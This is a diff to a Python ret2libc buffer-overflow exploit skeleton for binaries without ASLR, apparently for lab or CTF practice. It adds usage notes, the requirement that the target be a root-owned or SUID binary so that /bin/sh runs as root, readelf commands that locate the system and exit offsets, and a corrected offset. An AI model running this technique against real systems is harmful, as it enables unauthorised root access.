@@ -1,14 +1,16 @@
 #!/usr/bin/python
 
 ''' 
-Buffer overflow skeleton for Non-ASLR binary exploitation using return to libc method
+Buffer overflow skeleton for Non-ASLR binary exploitation using return to libc (ret2libc) method
 
 Author: Raul Bringas
 Credits: IppSec's great work and videos for helping me understand and write this exploit
 
 
 Replace ./binary-file with the name of the binary you are trying to exploit
-Usage: ./binary-file 'python r4mzi.py' 
+Usage: ./binary-file `python r4mzi.py`
+
+Requirements: Binary must be owned by root or have suid rights to execute /bin/sh as root
 '''
 
 import struct
@@ -29,12 +31,15 @@ libc_base_addr = 0xb7e19000
 '''
 2)  Determine the system & exit offset address
     readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 
-    1457: 0014ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+    0014ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+    
+    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+    0002e8a0    31 FUNC    GLOBAL   DEFAULT   13 exit@@GLIBC_2.0
 '''
 
 # Replace the values below with the address returned by the readelf command above
 system_offset = 0x0014ada0
-exit_offset = 0x0002e9d0
+exit_offset = 0x0002e8a0
 
 '''
 3)  Determine the address if /bin/sh in the vulnerable library
